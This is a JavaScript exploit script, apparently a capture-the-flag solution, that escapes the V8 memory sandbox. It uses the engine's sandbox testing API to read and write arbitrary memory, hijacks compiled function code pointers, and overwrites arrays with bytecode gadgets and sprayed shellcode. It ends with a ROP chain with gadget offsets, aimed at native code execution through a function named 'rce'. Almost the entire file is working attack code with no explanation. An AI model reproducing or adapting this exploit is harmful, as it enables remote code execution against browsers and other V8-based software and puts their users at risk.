ab = new ArrayBuffer(8);
f64 = new Float64Array(ab);
B64 = new BigInt64Array(ab);

function ftoi(f) { // float to int
    f64[0] = f;
    return B64[0];
}

function itof(i) { // int to float
    B64[0] = i;
    return f64[0];
}

function addrof(obj){
    return Sandbox.getAddressOf(obj);
}

function ar(addr){
  let reader = new Sandbox.MemoryView(addr, 64);
  let view = new DataView(reader);
  return view.getBigUint64(0, true);}

function aw(addr,value){
  let writer = new Sandbox.MemoryView(addr, 64);
  let view = new DataView(writer);
  view.setBigUint64(0, value, true);
}


function pwnx(a){
    //console.log(arguments.length);
    let i=0;
    for(i=0;i<0x50;i++){

    }
    return [a];
}

function maglev(a,b,c,d,e,f,g,h,h1){
    let i =0;
    for(i=0;i<0x50;i++){

    }
    return [a];
}

for(let i=0;i<0x300;i++){
    pwnx();
    maglev();
    for(let j=0;j<0x400;j++){

    }
}

pwnx_addr = addrof(pwnx);
maglev_addr = addrof(maglev);


maglev_code = ar(maglev_addr+12);
pwnx_code = ar(pwnx_addr+12);

console.log("Turbofan code: "+maglev_code.toString(16));
console.log("Pwn code: "+pwnx_code.toString(16));


pwnx_new_maglev = ((maglev_code&0xffffffffn)+(pwnx_code&0xffffffff00000000n));

console.log(pwnx_new_maglev.toString(16));

aw(pwnx_addr+12,pwnx_new_maglev);

function test(a,b,c,d,e){
    return b+c+d;
}

 
let shellcodics = new Array(500);

shellcodics[0]=1.3;

let shellx = [[1.1],[1.1],[1.1],[1.1],[1.1],[1.1],[1.1],[],shellcodics];

let shellx_addr = addrof(shellx);

aw(shellx_addr+0x20,0x068ffd0bn);//ldar gadjet
aw(shellx_addr+0x24,0x068f0118n);//skip to next instruction
aw(shellx_addr+0x28,0x068f200bn);//star gadjet to return addr

//overwrite return address

aw(shellx_addr+0x2c,0x068ffd18n);//ldar r12 pivoting
aw(shellx_addr+0x30,0x068f0c0cn);//star r12 pivot to rbp-0x20
aw(shellx_addr+0x34,0x068f1a18n);//lda zero //to set 
aw(shellx_addr+0x38,0x068f140bn);//star 0 to rbp-0x28 then ret 
aw(shellx_addr+0x3c,0xaf0c1b18n);
let sprayed_shell = BigInt(addrof(shellcodics)+0x7f8); //shellcodics float array

aw(shellx_addr+0x40,sprayed_shell); //push sprayed shell

function rce(a,b,c,d,e,f,g,h){
    test(0x10101010,0x10101010,0x1010);
    //%SystemBreak();
    return pwnx(0x1010);
}

console.log(Sandbox.targetPage.toString(16));

function slow(){
    for(let i=0;i<1e8;i++){

    }
}

function prepare(){
    //================ prepare r14 
    shellcodics[0]=itof(0x3f0bf018e20b7878n); //0x7878 - padding save ret addr to rdp+0x70
    shellcodics[1]=itof(0x510bef18000be218n);
    shellcodics[2]=itof(0xfc0b0018300dee18n);
    shellcodics[3]=itof(0x000dff1804180118n);
    shellcodics[4]=itof(0x2d1620182f16ed18n);
    shellcodics[5]=itof(0xaf2118n);
    //================= rop chain
    shellcodics[6]=itof(0x3116eb183016c6c6n);
    shellcodics[7]=itof(0x3316ef183216ed18n);
    shellcodics[8]=itof(0x3516f3183416f118n);
    shellcodics[9]=itof(0x100df6183616f418n);
    shellcodics[10]=itof(0x1c0bec181b0bee18n);
    shellcodics[11]=itof(0x0d01fe18000bf218n);
    shellcodics[12]=itof(0xaf10180000a1b6n);
    //=============rop offsets segment
    let sbx_high = BigInt(Sandbox.targetPage)>>32n;
    let sbx_low = BigInt(Sandbox.targetPage)&0xffffffffn;
    shellcodics[0x17]=itof(0x1336n+(sbx_low<<24n));//we can put pointer to our shellcode to stack.
    shellcodics[0x18]=itof(0xcf00000000001337n+(sbx_high<<24n)); //lda context 0x30 started here+0x7 (f4) is low byte
    shellcodics[0x19]=itof(0x8d0000a3ad0060f6n);//0x31 offset to pop rdi 
    shellcodics[0x1a]=itof(0x8b0000a3ad009d56n);
    shellcodics[0x1b]=itof(0xf3002304cd010d34n);
    shellcodics[0x1c]=itof(0x009416n);
    return;
}
//offset from r14 to base 0x4c3446
//  from base/from r14
// pop rax; ret 0x0000000000ad2b13 0x60f6cf
// pop rbp ; mov [rax], rcx; ret; 0x0000000000e04b39 //0x9416f3
// shl rax,cl ; pop rbp; ret 0x0000000000e98ad3 //0x9d568d
// pop rcx; ret; 0x4cd7f3 //0xa3ad
// mov edx,ecx ; ret; 0x00000000015968d1 // 0x10d348b
// add rax,rdx, pop rbp ret; // 0x00000000006f3913 //0x2304cd

prepare();
Math.cosh(1);

let retx = rce(shellx[8],shellx[7],shellx[6],shellx[5],shellx[4],shellx[3],shellx[2],shellx[1],shellx[0]);




